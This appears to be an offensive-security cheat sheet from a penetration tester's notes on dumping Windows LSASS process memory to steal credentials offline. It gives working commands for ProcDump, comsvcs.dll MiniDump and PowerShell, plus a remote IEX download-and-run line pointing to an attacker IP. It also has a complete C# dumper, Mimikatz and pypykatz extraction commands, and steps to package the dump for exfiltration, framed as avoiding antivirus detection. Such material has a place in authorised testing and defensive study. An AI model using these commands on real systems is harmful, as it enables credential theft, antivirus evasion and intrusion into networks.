---
tags:
  - Credential_Access
  - Foundational
  - Windows
---

## Memory Dump Techniques
resources: [MITRE - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)

> [!tip] Dump LSASS process memory for offline credential extraction. Avoids real-time AV detection of **Mimikatz**.

### Task Manager Dump [Remote]
> [!info] Requires GUI access and admin privileges:
> 1. Open Task Manager
> 2. Find lsass.exe in Details tab
> 3. Right-click, Create dump file
> 4. Dump saved to %TEMP%\lsass.DMP

### ProcDump [Remote]
```cmd
procdump.exe -ma lsass.exe lsass.dmp
```

```cmd
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

### comsvcs.dll MiniDump [Remote]
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

#### Get LSASS PID [Remote]
```cmd
tasklist /fi "imagename eq lsass.exe"
```

```powershell
(Get-Process lsass).Id
```

### PowerShell MiniDump [Remote]
```powershell
$proc = Get-Process lsass
$path = "C:\Windows\Temp\lsass.dmp"
[System.Diagnostics.ProcessDumpHelper]::GetProcessDump($proc.Id, $path)
```

### Out-Minidump (PowerSploit) [Remote]
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/Out-Minidump.ps1')
Get-Process lsass | Out-Minidump -DumpFilePath C:\Windows\Temp\
```

## MiniDumpWriteDump API

### C# Memory Dumper
```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

class Dumper
{
    [DllImport("dbghelp.dll")]
    static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    static void Main()
    {
        Process proc = Process.GetProcessesByName("lsass")[0];
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, proc.Id);

        using (FileStream fs = new FileStream(@"C:\Windows\Temp\lsass.dmp", FileMode.Create))
        {
            // MiniDumpWithFullMemory = 0x00000002
            MiniDumpWriteDump(hProcess, proc.Id, fs.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
```

## Offline Analysis

### Mimikatz Dump Analysis [Local]
```cmd
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### pypykatz Analysis [Local]
```bash
pypykatz lsa minidump lsass.dmp
```

### Extract Specific Credentials [Local]
```cmd
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::msv
sekurlsa::wdigest
sekurlsa::kerberos
```

## Exfiltration

### Compress Before Exfil [Remote]
```powershell
Compress-Archive -Path C:\Windows\Temp\lsass.dmp -DestinationPath C:\Windows\Temp\lsass.zip
```

### Base64 Encode [Remote]
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\lsass.dmp")
$b64 = [Convert]::ToBase64String($bytes)
$b64 | Out-File C:\Windows\Temp\lsass.b64
```

### Decode on Kali [Local]
```bash
base64 -d lsass.b64 > lsass.dmp
```
